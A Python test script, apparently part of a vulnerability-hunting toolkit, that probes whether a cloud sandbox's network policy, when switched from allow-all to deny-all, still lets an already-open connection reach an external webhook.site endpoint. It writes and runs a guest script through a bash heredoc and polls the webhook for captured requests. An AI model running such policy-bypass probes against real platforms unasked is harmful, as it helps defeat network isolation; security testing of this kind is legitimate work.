# -*- coding: utf-8 -*-
"""Phase3b: 策略热更新空窗测试 - allow-all 建连接, deny-all 后旧连接是否存活"""
import sys, threading, time, json, urllib.request
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_6M8Yg7kJadsCnQ8GlDyTeZJa6VaY"
WH_UUID = "57dad648-5daa-4ef8-8532-0d5dd3ceab68"
WH_IP = "178.63.67.153"

GUEST = r'''
import socket, time, os

IP = '178.63.67.153'
PATH = '/57dad648-5daa-4ef8-8532-0d5dd3ceab68'

s = socket.create_connection((IP, 80), timeout=8)
s.settimeout(10)
print('CONNECTED', flush=True)
req1 = ('GET %s?step=1 HTTP/1.1\r\nHost: webhook.site\r\nConnection: keep-alive\r\n\r\n' % PATH).encode()
s.sendall(req1)
d1 = b''
try:
    d1 = s.recv(4096)
except Exception as e:
    print('recv1 EXC %s' % e, flush=True)
print('RESP1: %r' % d1[:120], flush=True)

for i in range(30):
    if os.path.exists('/tmp/sig'):
        break
    time.sleep(1)
print('SIGNAL READY after %ds' % i, flush=True)

try:
    req2 = ('GET %s?step=2-after-denyall HTTP/1.1\r\nHost: webhook.site\r\nConnection: close\r\n\r\n' % PATH).encode()
    s.sendall(req2)
    d2 = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        d2 += chunk
    print('RESP2: %r' % d2[:200], flush=True)
except Exception as e:
    print('RESP2 EXC %s: %s' % (type(e).__name__, e), flush=True)
s.close()
print('DONE', flush=True)
'''

code = "cat > /tmp/pg4.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg4.py"


def run_guest():
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=70000)
    print('GUEST code:', c, flush=True)
    # 只打印 data 流
    try:
        obj = json.loads(r)
        for item in obj.get('data', []):
            if isinstance(item, dict) and 'data' in item:
                print(item['data'], end='', flush=True)
    except Exception:
        print(r[:2000], flush=True)


def check_webhook():
    req = urllib.request.Request(
        "https://webhook.site/token/%s/requests?sorting=newest" % WH_UUID)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            d = json.loads(r.read().decode())
        for item in d.get('data', []):
            print('WH:', item.get('method'), item.get('url'), item.get('created_at'), flush=True)
        if not d.get('data'):
            print('WH: no requests captured', flush=True)
    except Exception as e:
        print('WH check EXC %s: %s' % (type(e).__name__, e), flush=True)


if __name__ == "__main__":
    # 1. 切 allow-all
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM),
               {"mode": "allow-all"})
    print('set allow-all:', c, r[:200], flush=True)
    time.sleep(2)

    # 2. 后台启动 guest
    th = threading.Thread(target=run_guest)
    th.start()

    # 3. 等连接建立+响应1(12 秒)
    time.sleep(12)

    # 4. 切 deny-all
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM),
               {"mode": "deny-all"})
    print('set deny-all:', c, r[:200], flush=True)
    time.sleep(2)

    # 5. 发信号
    c, r = cmd(SID, "bash", ["-lc", "touch /tmp/sig"], timeout_ms=20000)
    print('signal:', c, flush=True)

    # 6. 等 guest 完成
    th.join(timeout=70)
    print('--- webhook captures ---', flush=True)
    check_webhook()
